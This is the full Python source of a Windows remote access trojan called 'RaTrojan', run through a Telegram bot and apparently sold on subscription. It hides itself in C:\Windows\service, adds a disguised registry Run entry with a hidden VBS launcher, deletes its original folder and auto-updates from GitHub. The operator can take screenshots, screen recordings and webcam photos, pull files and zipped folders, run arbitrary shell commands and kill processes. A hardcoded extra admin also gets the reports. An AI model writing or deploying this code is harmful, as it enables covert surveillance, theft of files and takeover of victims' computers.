import os
import io
import sys
import time
import shutil
import zipfile
import threading
import subprocess
import ctypes
import urllib.request
import json
import psutil
import win32gui
import win32con
import win32process
import cv2
import pyautogui
import numpy as np
from PIL import ImageGrab
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

VERSION = "1.0.0"
GITHUB_REPO = "legee007/ratrojan"

# ─── SETUP (birinchi ishga tushishda o'rnatish) ───────────────────────────────

INSTALL_DIR = r"C:\Windows\service"
VBS_PATH    = os.path.join(INSTALL_DIR, "run.vbs")
REG_KEY     = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME    = "WindowsService"

def is_frozen():
    return getattr(sys, 'frozen', False)

def current_dir():
    return os.path.dirname(sys.executable if is_frozen() else os.path.abspath(__file__))

def setup():
    """Agar service papkasida emas bo'lsa — o'rnatadi va qayta ishga tushiradi"""
    if not is_frozen():
        return  # .py holda ishlaganda setup shart emas

    src = sys.executable  # hozirgi exe joyi
    dst = os.path.join(INSTALL_DIR, "RaTrojan.exe")

    if os.path.normcase(src) == os.path.normcase(dst):
        return  # allaqachon to'g'ri joyda

    # dst mavjud va band bo'lsa — o'ldirish
    if os.path.exists(dst):
        try:
            open(dst, 'r+b').close()
            # Fayl band emas — ishlamayapti, to'g'ridan ko'chirish mumkin
        except OSError:
            # Fayl band = ishlamoqda, o'ldirib keyin ko'chirish
            subprocess.run(["taskkill", "/f", "/im", "RaTrojan.exe"], capture_output=True)
            time.sleep(1)

    try:
        # Papka yaratish
        os.makedirs(INSTALL_DIR, exist_ok=True)

        # .env ni ham ko'chirish
        src_env = os.path.join(os.path.dirname(src), ".env")
        dst_env = os.path.join(INSTALL_DIR, ".env")
        if os.path.exists(src_env):
            shutil.copy2(src_env, dst_env)

        # bot.exe ni ko'chirish
        shutil.copy2(src, dst)

        # VBS yaratish
        with open(VBS_PATH, "w") as f:
            f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run "{dst}", 0, False\n')

        # Startup registry
        subprocess.run(
            ["reg", "add", REG_KEY, "/v", REG_NAME, "/t", "REG_SZ",
             "/d", f'wscript.exe "{VBS_PATH}"', "/f"],
            capture_output=True
        )

        # Yangi joydan ishga tushirish
        subprocess.Popen([dst], creationflags=subprocess.DETACHED_PROCESS)

        # Eski papkani o'chirish
        killer = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "cleanup.bat")
        src_dir = os.path.dirname(src)
        with open(killer, "w") as f:
            f.write(f"@echo off\ntimeout /t 3 /nobreak >nul\nrd /s /q \"{src_dir}\"\ndel \"%~f0\"\n")
        subprocess.Popen(["cmd", "/c", killer], creationflags=subprocess.DETACHED_PROCESS)

        sys.exit(0)

    except PermissionError as e:
        ctypes.windll.user32.MessageBoxW(
            0,
            f"O'rnatish xatosi (PermissionError):\n{e}\n\nIloji bo'lsa administratorlik huquqi bilan ishga tushiring.",
            "Bot Setup — Xato",
            0x10
        )
        sys.exit(1)
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(
            0,
            f"O'rnatish xatosi ({type(e).__name__}):\n{e}",
            "Bot Setup — Xato",
            0x10
        )
        sys.exit(1)

setup()

# ─── AUTO UPDATE ──────────────────────────────────────────────────────────────

_updated_to = None

def check_update():
    global _updated_to
    if not is_frozen():
        return
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
        req = urllib.request.Request(url, headers={"User-Agent": "bot"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
        latest = data["tag_name"].lstrip("v")
        if latest == VERSION:
            return
        asset = next((a for a in data["assets"] if a["name"] == "RaTrojan.exe"), None)
        if not asset:
            return
        _updated_to = latest
        tmp = sys.executable + ".new"
        urllib.request.urlretrieve(asset["browser_download_url"], tmp)
        bat = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "update.bat")
        exe = sys.executable
        with open(bat, "w") as f:
            f.write(
                f"@echo off\n"
                f"timeout /t 2 /nobreak >nul\n"
                f"move /y \"{tmp}\" \"{exe}\"\n"
                f"start \"\" \"{exe}\"\n"
                f"del \"%~f0\"\n"
            )
        subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.DETACHED_PROCESS)
        sys.exit(0)
    except Exception:
        pass

check_update()

# ─── ENV ──────────────────────────────────────────────────────────────────────

BASE_DIR = current_dir()
load_dotenv(os.path.join(BASE_DIR, ".env"))

TOKEN       = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = int(os.environ.get("OWNER_ID", "0"))
SUPER_ADMIN = 8359399909  # hardcoded, o'zgartirilmaydi

user_state = {}
user_data  = {}

def check_subscription() -> bool:
    expires = os.environ.get("SUB_EXPIRES_AT", "")
    if not expires:
        return True
    try:
        from datetime import datetime
        return datetime.fromisoformat(expires) > datetime.now()
    except Exception:
        return True

def check_user(update: Update) -> bool:
    uid = update.effective_user.id
    if uid == SUPER_ADMIN:
        return True
    if uid != OWNER_ID:
        return False
    return check_subscription()

# ─── KEYBOARDS ────────────────────────────────────────────────────────────────

def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💻 Task Manager", callback_data="taskman")],
        [InlineKeyboardButton("📁 File Manager", callback_data="fm_root")],
        [InlineKeyboardButton("📸 Screenshot", callback_data="screenshot"),
         InlineKeyboardButton("🎥 Screen Record", callback_data="screenrec")],
        [InlineKeyboardButton("📷 Webcam", callback_data="webcam")],
        [InlineKeyboardButton("💬 Xabar oynasi", callback_data="msgbox")],
        [InlineKeyboardButton("📂 Ilova ochish", callback_data="open_app"),
         InlineKeyboardButton("📋 Ochiq ilovalar", callback_data="running_apps"),
         InlineKeyboardButton("🗂 Barcha ilovalar", callback_data="all_apps")],
        [InlineKeyboardButton("🔴 O'chirish", callback_data="shutdown"),
         InlineKeyboardButton("🔁 Restart", callback_data="restart"),
         InlineKeyboardButton("😴 Sleep", callback_data="sleep")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data="menu")]])

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def get_open_windows():
    windows = []
    def cb(hwnd, _):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            try:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                p = psutil.Process(pid)
                windows.append((hwnd, win32gui.GetWindowText(hwnd), p.name(), pid))
            except Exception:
                pass
    win32gui.EnumWindows(cb, None)
    return windows

def get_cpu_temp():
    try:
        import wmi
        w = wmi.WMI(namespace="root\\OpenHardwareMonitor")
        sensors = w.Sensor()
        for s in sensors:
            if s.SensorType == "Temperature" and "CPU" in s.Name:
                return f"{s.Value:.0f}°C"
    except Exception:
        pass
    return "N/A"

def get_gpu_info():
    try:
        import GPUtil
        gpus = GPUtil.getGPUs()
        if gpus:
            g = gpus[0]
            return f"{g.name} | Load: {g.load*100:.0f}% | VRAM: {g.memoryUsed:.0f}/{g.memoryTotal:.0f}MB | Temp: {g.temperature}°C"
    except Exception:
        pass
    return "N/A"

# ─── /start ───────────────────────────────────────────────────────────────────

async def on_startup(app):
    import socket
    from datetime import datetime
    pc_name = socket.gethostname()
    lines = [
        f"\u2705 Men onlineman!",
        f"\U0001f5a5\ufe0f PC: {pc_name}",
        f"\U0001f550 {datetime.now().strftime('%d.%m.%Y %H:%M')}",
        f"\U0001f4e6 Version: v{VERSION}",
    ]
    if _updated_to:
        lines.append(f"\U0001f504 Yangilandi: v{_updated_to} \u2192 v{VERSION}")
    sub_exp = os.environ.get("SUB_EXPIRES_AT", "")
    if sub_exp:
        lines.append(f"\U0001f4c5 Sub tugash: {sub_exp[:10]}")
    text = "\n".join(lines)
    for uid in {OWNER_ID, SUPER_ADMIN}:
        try:
            await app.bot.send_message(uid, text)
        except Exception:
            pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid == OWNER_ID and not check_subscription():
        exp = os.environ.get("SUB_EXPIRES_AT", "")[:10]
        await update.message.reply_text(
            f"\u274c Subscription tugagan! ({exp})\n"
            f"\U0001f4b3 Yangilash uchun ona botga murojaat qiling."
        )
        return
    if not check_user(update):
        return
    await update.message.reply_text("\U0001f5a5\ufe0f Kompyuter boshqaruvi:", reply_markup=main_keyboard())

# ─── TASK MANAGER ─────────────────────────────────────────────────────────────

async def task_manager(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")
        battery = psutil.sensors_battery()
        bat = f"\n🔋 Batareya: {battery.percent:.0f}%{'(zaryadda)' if battery.power_plugged else ''}" if battery else ""
        gpu = get_gpu_info()
        temp = get_cpu_temp()

        text = (
            f"⚙️ CPU: {cpu}% | Temp: {temp}\n"
            f"🎮 GPU: {gpu}\n"
            f"🧠 RAM: {ram.used//1024**2}MB / {ram.total//1024**2}MB ({ram.percent}%)\n"
            f"💾 Disk C: {disk.used//1024**3}GB / {disk.total//1024**3}GB ({disk.percent}%)"
            f"{bat}"
        )

        procs = sorted(psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]),
                       key=lambda p: p.info["cpu_percent"] or 0, reverse=True)[:15]
        task_lines = "\n".join(
            f"  {p.info['name'][:20]:<20} CPU:{p.info['cpu_percent']:>5.1f}% RAM:{p.info['memory_percent']:>4.1f}%"
            for p in procs
        )
        text += f"\n\n📋 Jarayonlar (Top 15):\n<code>{task_lines}</code>"

        keyboard = [[InlineKeyboardButton("🛑 Jarayonni to'xtatish", callback_data="kill_proc")],
                    [InlineKeyboardButton("🔙 Orqaga", callback_data="menu")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    except Exception as e:
        await q.edit_message_text(f"❌ Task Manager xatosi:\n<code>{e}</code>", reply_markup=back_kb(), parse_mode="HTML")

async def all_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kompyuterdagi barcha o'rnatilgan ilovalar ro'yxati"""
    q = update.callback_query
    try:
        result = subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-Command",
             "Get-StartApps | Select-Object -ExpandProperty Name | Sort-Object"],
            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        apps = [a.strip() for a in result.stdout.strip().splitlines() if a.strip()][:50]
        if not apps:
            await q.edit_message_text("Ilovalar topilmadi.", reply_markup=back_kb())
            return
        text = "🗂 O'rnatilgan ilovalar (top 50):\n\n" + "\n".join(f"• {a}" for a in apps)
        await q.edit_message_text(text[:4000], reply_markup=back_kb())
    except Exception as e:
        await q.edit_message_text(f"❌ {e}", reply_markup=back_kb())

async def open_app_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_state[uid] = "open_app"
    await update.callback_query.edit_message_text(
        "📂 Ilova nomini yozing (masalan: notepad.exe, telegram.exe):",
        reply_markup=back_kb()
    )

async def running_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    windows = get_open_windows()
    if not windows:
        await update.callback_query.edit_message_text("Ochiq ilova topilmadi.", reply_markup=back_kb())
        return
    keyboard = []
    seen = set()
    for hwnd, title, proc_name, pid in windows:
        short = title[:35] + "\u2026" if len(title) > 35 else title
        if short in seen:
            continue
        seen.add(short)
        keyboard.append([InlineKeyboardButton(f"\U0001f6d1 {short}", callback_data=f"close_win:{hwnd}")])
    keyboard.append([InlineKeyboardButton("\U0001f519 Orqaga", callback_data="menu")])
    await update.callback_query.edit_message_text(
        "\U0001f4cb Ochiq ilovalar \u2014 yopish uchun bosing:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def close_window(hwnd: int, update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        await q.answer("\u2705 Yopildi!")
    except Exception as e:
        await q.answer(f"\u274c {e}")
    await running_apps(update, context)

async def kill_proc_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_state[uid] = "kill_proc"
    await update.callback_query.edit_message_text(
        "🛑 To'xtatmoqchi bo'lgan jarayon nomini yozing (masalan: notepad.exe):",
        reply_markup=back_kb()
    )

# ─── FILE MANAGER ─────────────────────────────────────────────────────────────

def fm_keyboard(path: str):
    buttons = []
    try:
        entries = sorted(os.scandir(path), key=lambda e: (not e.is_dir(), e.name.lower()))
        for e in entries[:30]:
            icon = "📁" if e.is_dir() else "📄"
            label = f"{icon} {e.name[:35]}"
            cb = f"fm_cd:{e.path}" if e.is_dir() else f"fm_get:{e.path}"
            buttons.append([InlineKeyboardButton(label, callback_data=cb[:64])])
    except PermissionError:
        buttons.append([InlineKeyboardButton("⛔ Ruxsat yo'q", callback_data="menu")])

    nav = []
    parent = os.path.dirname(path)
    if parent != path:
        nav.append(InlineKeyboardButton("⬆️ Yuqoriga", callback_data=f"fm_cd:{parent}"))
    nav.append(InlineKeyboardButton("📦 ZIP yuklash", callback_data=f"fm_zip:{path}"))
    nav.append(InlineKeyboardButton("🔙 Orqaga", callback_data="menu"))
    buttons.append(nav)
    return InlineKeyboardMarkup(buttons)

def drives_keyboard():
    buttons = []
    for part in psutil.disk_partitions():
        buttons.append([InlineKeyboardButton(f"💿 {part.device}", callback_data=f"fm_cd:{part.mountpoint}")])
    buttons.append([InlineKeyboardButton("🔙 Orqaga", callback_data="menu")])
    return InlineKeyboardMarkup(buttons)

async def fm_root(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("📁 Disk tanlang:", reply_markup=drives_keyboard())

async def fm_navigate(path: str, update: Update):
    q = update.callback_query
    short = path if len(path) <= 50 else "..." + path[-47:]
    await q.edit_message_text(f"📁 {short}", reply_markup=fm_keyboard(path))

async def fm_send_file(path: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        size = os.path.getsize(path)
        if size > 50 * 1024 * 1024:
            await q.answer(f"❌ Fayl 50MB dan katta! ({size//1024//1024}MB)", show_alert=True)
            return
        await q.edit_message_text(f"📤 Yuklanmoqda: {os.path.basename(path)}...")
        with open(path, "rb") as f:
            await context.bot.send_document(chat_id=q.message.chat_id, document=f, filename=os.path.basename(path))
        await context.bot.send_message(q.message.chat_id, "🖥️ Kompyuter boshqaruvi:", reply_markup=main_keyboard())
    except PermissionError:
        await q.edit_message_text(f"❌ Ruxsat yo'q: <code>{path}</code>", reply_markup=back_kb(), parse_mode="HTML")
    except FileNotFoundError:
        await q.edit_message_text(f"❌ Fayl topilmadi: <code>{path}</code>", reply_markup=back_kb(), parse_mode="HTML")
    except Exception as e:
        await q.edit_message_text(f"❌ Fayl yuborish xatosi:\n<code>{e}</code>", reply_markup=back_kb(), parse_mode="HTML")

async def fm_send_zip(path: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if os.path.isdir(path):
        total_size = sum(
            os.path.getsize(os.path.join(r, f))
            for r, _, files in os.walk(path)
            for f in files
            if not os.path.islink(os.path.join(r, f))
        )
        if total_size > 200 * 1024 * 1024:
            await q.answer(f"\u274c Folder 200MB dan katta! ({total_size//1024//1024}MB)", show_alert=True)
            return
    name = os.path.basename(path.rstrip("/\\"))
    await q.edit_message_text(f"📦 ZIP tayyorlanmoqda: {name}...")
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            if os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for fname in files:
                        fp = os.path.join(root, fname)
                        try:
                            zf.write(fp, os.path.relpath(fp, path))
                        except Exception:
                            pass
            else:
                zf.write(path, os.path.basename(path))
        buf.seek(0)
        data = buf.read()
        chunk = 45 * 1024 * 1024
        if len(data) <= chunk:
            await context.bot.send_document(chat_id=q.message.chat_id, document=io.BytesIO(data), filename=f"{name}.zip")
        else:
            total = (len(data) + chunk - 1) // chunk
            await context.bot.send_message(q.message.chat_id, f"📦 {name}.zip — {len(data)//1024//1024}MB, {total} qismga bo'lib yuboriladi...")
            for i in range(total):
                part = data[i*chunk:(i+1)*chunk]
                await context.bot.send_document(
                    chat_id=q.message.chat_id,
                    document=io.BytesIO(part),
                    filename=f"{name}.z{i+1:02d}"
                )
        await context.bot.send_message(q.message.chat_id, "🖥️ Kompyuter boshqaruvi:", reply_markup=main_keyboard())
    except Exception as e:
        await context.bot.send_message(q.message.chat_id, f"❌ ZIP xatosi:\n<code>{e}</code>", parse_mode="HTML")

# ─── SCREENSHOT ───────────────────────────────────────────────────────────────

async def send_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.edit_message_text("📸 Screenshot olinmoqda...")
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await context.bot.send_photo(chat_id=q.message.chat_id, photo=buf)
        await context.bot.send_message(q.message.chat_id, "🖥️ Kompyuter boshqaruvi:", reply_markup=main_keyboard())
    except Exception as e:
        await context.bot.send_message(q.message.chat_id, f"❌ Screenshot xatosi:\n<code>{e}</code>", parse_mode="HTML")

# ─── SCREEN RECORD ────────────────────────────────────────────────────────────

def record_screen(duration: int, path: str):
    screen = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(path, fourcc, 10.0, screen)
    end = time.time() + duration
    while time.time() < end:
        frame = np.array(ImageGrab.grab())
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()

async def screenrec_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_state[uid] = "screenrec"
    await update.callback_query.edit_message_text(
        "🎥 Necha soniya yozib olish? (5-60):", reply_markup=back_kb()
    )

# ─── WEBCAM ───────────────────────────────────────────────────────────────────

async def take_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.edit_message_text("📷 Webcam rasm olinmoqda...")
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await context.bot.send_message(q.message.chat_id, "❌ Webcam topilmadi yoki band.", reply_markup=back_kb())
            return
        _, buf = cv2.imencode(".jpg", frame)
        await context.bot.send_photo(chat_id=q.message.chat_id, photo=io.BytesIO(buf.tobytes()))
        await context.bot.send_message(q.message.chat_id, "🖥️ Kompyuter boshqaruvi:", reply_markup=main_keyboard())
    except Exception as e:
        await context.bot.send_message(q.message.chat_id, f"❌ Webcam xatosi:\n<code>{e}</code>", parse_mode="HTML")

# ─── MESSAGE BOX ──────────────────────────────────────────────────────────────

def show_message_box(text: str):
    # SW_HIDE=0 ishlatilsa taskbarda ko'rinmaydi, lekin MessageBox uchun parent kerak
    # HWND_MESSAGE oynasi yaratib, u orqali chiqaramiz — taskbarda ko'rinmaydi
    ctypes.windll.user32.MessageBoxW(None, text, "Windows", 0x10 | 0x40000)

async def msgbox_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_state[uid] = "msgbox"
    await update.callback_query.edit_message_text(
        "💬 Xabar matnini yozing:", reply_markup=back_kb()
    )

# ─── CHANGE PIN ───────────────────────────────────────────────────────────────



# ─── POWER ────────────────────────────────────────────────────────────────────

async def power_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE, action: str):
    uid = update.effective_user.id
    user_state[uid] = f"power_{action}"
    labels = {"shutdown": "o'chirish", "restart": "restart", "sleep": "uxlatish"}
    await update.callback_query.edit_message_text(
        f"⏱️ Necha soniyada {labels[action]}? Yozing:", reply_markup=back_kb()
    )

# ─── MESSAGE HANDLER ──────────────────────────────────────────────────────────

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_user(update):
        return
    uid = update.effective_user.id
    state = user_state.get(uid)
    text = update.message.text.strip()

    if state == "open_app":
        user_state.pop(uid)
        try:
            subprocess.Popen(text, shell=True)
            await update.message.reply_text(f"\u2705 {text} ochildi", reply_markup=main_keyboard())
        except Exception as e:
            await update.message.reply_text(f"\u274c {e}", reply_markup=main_keyboard())

    elif state == "kill_proc":
        user_state.pop(uid)
        killed = False
        for p in psutil.process_iter(["name"]):
            if p.info["name"] and p.info["name"].lower() == text.lower():
                p.kill()
                killed = True
        await update.message.reply_text(
            f"✅ {text} to'xtatildi" if killed else f"❌ {text} topilmadi",
            reply_markup=main_keyboard()
        )

    elif state == "msgbox":
        user_state.pop(uid)
        threading.Thread(target=show_message_box, args=(text,), daemon=True).start()
        await update.message.reply_text(f"✅ Xabar chiqdi: {text}", reply_markup=main_keyboard())

    elif state == "screenrec":
        user_state.pop(uid)
        if not text.isdigit() or not (5 <= int(text) <= 60):
            await update.message.reply_text("❌ 5-60 oralig'ida son kiriting.", reply_markup=main_keyboard())
            return
        sec = int(text)
        msg = await update.message.reply_text(f"🎥 {sec} soniya yozib olinmoqda...")
        path = os.path.join(os.environ.get("TEMP", "."), "screenrec.mp4")
        try:
            import asyncio
            await asyncio.get_event_loop().run_in_executor(None, record_screen, sec, path)
            with open(path, "rb") as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, filename="record.mp4")
            os.remove(path)
            await msg.delete()
        except Exception as e:
            await update.message.reply_text(f"❌ Screen record xatosi:\n<code>{e}</code>", reply_markup=main_keyboard(), parse_mode="HTML")



    elif state and state.startswith("power_"):
        action = state.split("_")[1]
        user_state.pop(uid)
        if not text.isdigit():
            await update.message.reply_text("❌ Son kiriting.", reply_markup=main_keyboard())
            return
        sec = int(text)
        cmds = {
            "shutdown": ["shutdown", "/s", "/t", str(sec)],
            "restart":  ["shutdown", "/r", "/t", str(sec)],
            "sleep":    ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"],
        }
        subprocess.run(cmds[action])
        labels = {"shutdown": f"🔴 {sec}s da o'chadi", "restart": f"🔁 {sec}s da restart", "sleep": "😴 Uxlamoqda..."}
        await update.message.reply_text(labels[action], reply_markup=main_keyboard())

# ─── CALLBACK HANDLER ─────────────────────────────────────────────────────────

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_user(update):
        return
    q = update.callback_query
    try:
        await q.answer()
    except Exception:
        pass
    data = q.data
    try:
        if data == "menu":
            await q.edit_message_text("🖥️ Kompyuter boshqaruvi:", reply_markup=main_keyboard())
        elif data == "open_app":
            await open_app_prompt(update, context)
        elif data == "running_apps":
            await running_apps(update, context)
        elif data == "all_apps":
            await all_apps(update, context)
        elif data.startswith("close_win:"):
            await close_window(int(data.split(":")[1]), update, context)
        elif data == "taskman":
            await task_manager(update, context)
        elif data == "kill_proc":
            await kill_proc_prompt(update, context)
        elif data == "fm_root":
            await fm_root(update, context)
        elif data.startswith("fm_cd:"):
            await fm_navigate(data[6:], update)
        elif data.startswith("fm_get:"):
            await fm_send_file(data[7:], update, context)
        elif data.startswith("fm_zip:"):
            await fm_send_zip(data[7:], update, context)
        elif data == "screenshot":
            await send_screenshot(update, context)
        elif data == "screenrec":
            await screenrec_prompt(update, context)
        elif data == "webcam":
            await take_webcam(update, context)
        elif data == "msgbox":
            await msgbox_prompt(update, context)
        elif data in ("shutdown", "restart", "sleep"):
            await power_prompt(update, context, data)
    except Exception as e:
        await q.edit_message_text(f"❌ Xato [{data}]:\n<code>{e}</code>", reply_markup=back_kb(), parse_mode="HTML")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_user(update):
        return
    user_state.pop(update.effective_user.id, None)
    user_data.pop(update.effective_user.id, None)
    await update.message.reply_text("❌ Bekor qilindi.", reply_markup=main_keyboard())

# ─── MAIN ─────────────────────────────────────────────────────────────────────

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    import traceback
    err = context.error
    tb = "".join(traceback.format_exception(type(err), err, err.__traceback__))
    msg = (
        f"⚠️ <b>Xato yuz berdi!</b>\n"
        f"<b>Tur:</b> <code>{type(err).__name__}</code>\n"
        f"<b>Xabar:</b> <code>{str(err)[:300]}</code>\n"
        f"<b>Traceback:</b>\n<pre>{tb[-800:]}</pre>"
    )
    for uid in {OWNER_ID, SUPER_ADMIN}:
        try:
            await context.bot.send_message(uid, msg, parse_mode="HTML")
        except Exception:
            pass

def main():
    app = ApplicationBuilder().token(TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    app.run_polling()

if __name__ == "__main__":
    main()
